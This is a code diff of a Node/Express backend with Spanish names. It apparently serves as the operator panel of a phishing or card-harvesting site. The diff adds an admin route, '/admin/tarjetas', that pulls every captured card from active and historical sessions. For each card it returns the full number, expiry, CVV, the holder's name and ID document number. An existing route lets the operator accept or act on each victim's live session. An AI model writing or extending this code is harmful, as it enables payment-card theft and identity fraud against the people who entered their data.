@@ -51,9 +51,7 @@ app.post('/api/sesion', (req, res) => {
 app.get('/api/sesion/:sessionId/estado', (req, res) => {
     const { sessionId } = req.params;
     const sesion = db.sesiones.find(s => s.sessionId === sessionId);
-    
     if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
-    
     res.json({ estado: sesion.estado });
 });
 
@@ -86,8 +84,8 @@ app.post('/admin/login', (req, res) => {
 app.post('/admin/sesion/:sessionId/accion', (req, res) => {
     const { sessionId } = req.params;
     const { accion } = req.body;
-
     const sesion = db.sesiones.find(s => s.sessionId === sessionId);
+    
     if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
 
     if (accion === 'ACEPTAR') sesion.estado = 'aceptado';
@@ -98,6 +96,36 @@ app.post('/admin/sesion/:sessionId/accion', (req, res) => {
     guardarDB();
 
     res.json({ ok: true, estado: sesion.estado });
+});
+
+// 🔥 NUEVA RUTA: Extrae todas las tarjetas ingresadas (activas y finalizadas) 🔥
+app.get('/admin/tarjetas', (req, res) => {
+    const tarjetasActivas = db.sesiones.filter(s => s.datos && s.datos.tarjeta).map(s => ({
+        sessionId: s.sessionId,
+        nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''),
+        documento: s.datos.docNumber || '-',
+        tarjeta: s.datos.tarjeta,
+        expMes: s.datos.expMes || '',
+        expAnio: s.datos.expAnio || '',
+        cvv: s.datos.cvv || '-',
+        estado: s.estado,
+        fecha: s.fecha
+    }));
+
+    const tarjetasHistorial = db.historial.filter(s => s.datos && s.datos.tarjeta).map(s => ({
+        sessionId: s.sessionId,
+        nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''),
+        documento: s.datos.docNumber || '-',
+        tarjeta: s.datos.tarjeta,
+        expMes: s.datos.expMes || '',
+        expAnio: s.datos.expAnio || '',
+        cvv: s.datos.cvv || '-',
+        estado: s.estado,
+        fecha: s.fecha
+    }));
+
+    const todas = [...tarjetasActivas, ...tarjetasHistorial].sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
+    res.json({ tarjetas: todas });
 });
 
 app.get('/admin/activos', (req, res) => res.json({ activos: [] }));
